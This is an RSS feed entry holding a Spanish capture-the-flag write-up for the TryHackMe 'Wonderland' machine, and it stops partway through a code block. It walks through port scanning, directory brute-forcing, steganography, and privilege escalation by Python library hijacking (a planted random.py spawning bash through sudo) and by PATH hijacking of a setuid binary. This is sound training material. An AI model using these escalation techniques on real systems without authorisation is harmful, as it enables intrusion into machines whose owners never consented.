<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>sckull</title>
    <link>https://sckull.github.io/</link>
    <description>Recent content on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Tue, 01 Sep 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
      
      
      

      
      <item>
        <title>TryHackMe - Wonderland</title>
        <link>https://sckull.github.io/posts/wonderland/</link>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 01 Sep 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/wonderland/</guid>
        <description>Wonderland es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Wonderland es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Wonderland&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Fall down the rabbit hole and enter wonderland.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;130&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Sep  1 00:47:40 2020 as: nmap -Pn -sV -o mini_scan wonderland.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; wonderland.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.220.104&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep  1 00:49:59 2020 -- 1 IP address (1 host up) scanned in 138.96 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_22-56-30.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen en la pagina, la descargamos, analizamos y encontramos un archivo dentro de la imagen el cual nos da una pista.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ steghide info white_rabbit_1.jpg 
&lt;span class=&#34;s2&#34;&gt;&amp;#34;white_rabbit_1.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;:
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
kali@kali:~/thm/wonderland$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;.
kali@kali:~/thm/wonderland$ cat hint.txt 
follow the r a b b i t
kali@kali:~/thm/wonderland$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/r &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;steganografia&#34;&gt;STEGANOGRAFIA&lt;/h2&gt;
&lt;p&gt;En &lt;code&gt;/img&lt;/code&gt; encontramos dos imagenes nuevas, utilizamos steghide y binwalk pero no encontramos nada interesante dentro de estas imagenes.&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/r&lt;/code&gt; solo encontramos una frase, ejecutamos gobuster nuevamente en este directorio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-04-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos &lt;code&gt;/r/a&lt;/code&gt; y nuevamente una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-07-59.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos nuevamente una frase en &lt;code&gt;/r/a/b/&lt;/code&gt; al pasarle gobuster &lt;code&gt;/r/a/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-10-50.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al pasarle nuevamente a &lt;code&gt;/r/a/b/&lt;/code&gt; encontramos &lt;code&gt;/r/a/b/b/&lt;/code&gt; lo cual indica que la palabra que forma estos directorios es &lt;code&gt;rabbit&lt;/code&gt; el cual es la pista que encontramos en la imagen. Al visitar &lt;code&gt;/r/a/b/b/i/t/&lt;/code&gt; vemos una nueva pagina con una imagen nueva.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-15-29.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además vemos lo que parecen ser unas credenciales escondidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-16-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;alice---user&#34;&gt;ALICE - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell con la usuario Alice.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-20-57.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que podemos ejecutar python3 con el script &lt;code&gt;walrus_and_the_carpenter.py&lt;/code&gt; con el usuario &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-44-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:walrus_and_the_carpenter.py&#34; data-lang=&#34;python:walrus_and_the_carpenter.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;The sun was shining on the sea,
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shining with all his might:
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;He did his very best to make
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The billows smooth and bright —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And this was odd, because it was
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The middle of the night.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;O Oysters,&amp;#34; said the Carpenter.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You’ve had a pleasant run!
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shall we be trotting home again?&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;But answer came there none —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And that was scarcely odd, because
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;They’d eaten every one.&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;The line was:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos tambien a &lt;code&gt;perl&lt;/code&gt; con &amp;ldquo;capabilites&amp;rdquo; pero al intentar utilizar este nos mostró que no tenemos permisos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-41-48.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rabbit---user&#34;&gt;RABBIT - USER&lt;/h2&gt;
&lt;p&gt;El script importa la libreria &lt;code&gt;random&lt;/code&gt;, por lo cual se podria realizar &lt;a href=&#34;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&#34;&gt;&lt;strong&gt;Python Library Hijacking&lt;/strong&gt;&lt;/a&gt;. Intentamos crear el archivo &lt;code&gt;import.py&lt;/code&gt; con una shell inversa dentro, ejecutamos &lt;code&gt;sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/code&gt; pero la shell moría al conectarse. Ya que tenemos una shell ssh, ejecutamos &lt;code&gt;/bin/bash&lt;/code&gt; el cual nos devolveria una shell con el usuario rabbit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;import os; os.system(&amp;#39;/bin/bash&amp;#39;);&amp;#34;&lt;/span&gt; &amp;gt; random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-11-14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con este archivo y encontramos &lt;code&gt;teaParty&lt;/code&gt; el cual copiamos a nuestra maquina para analizarlo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-13-51.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutar &lt;code&gt;strings&lt;/code&gt; vemos que posiblemente se realiza una ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;, pero hay que tomar encuenta que &lt;code&gt;echo&lt;/code&gt; lleva el PATH/direccion del mismo y &lt;code&gt;date&lt;/code&gt; no.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-14-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo fuente generado por &lt;code&gt;Ghidra&lt;/code&gt; nos indica que si realiza la ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Welcome to the tea party!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;The Mad Hatter will be here soon.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/echo -n &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Probably by &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; &amp;amp;&amp;amp; date --date=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;next hour&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; -R&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Ask very nicely, and I will give you some tea while you wait for him&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;getchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Segmentation fault (core dumped)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Primero, intentamos utilizar nuevamente &lt;code&gt;perl&lt;/code&gt; pero, no tenemos permiso.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-45-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;hatter---user&#34;&gt;HATTER - USER&lt;/h2&gt;
&lt;p&gt;Realizamos &lt;code&gt;&amp;quot;Hijacking PATH&amp;quot;&lt;/code&gt;, el objetivo es &lt;code&gt;date&lt;/code&gt; ya que toma el &lt;code&gt;$PATH/date&lt;/code&gt; actual del usuario que lo ejecuta. Para ello modificamos la variable &lt;code&gt;$PATH&lt;/code&gt; agregando al principio una direccion a conveniencia, en este caso el directorio principal de &lt;code&gt;rabbit&lt;/code&gt; en el que seguidamente creamos el archivo &lt;code&gt;date&lt;/code&gt; el cual ejecutará &lt;code&gt;/bin/bash&lt;/code&gt; y para finalizar hacemos ejecutable tal archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
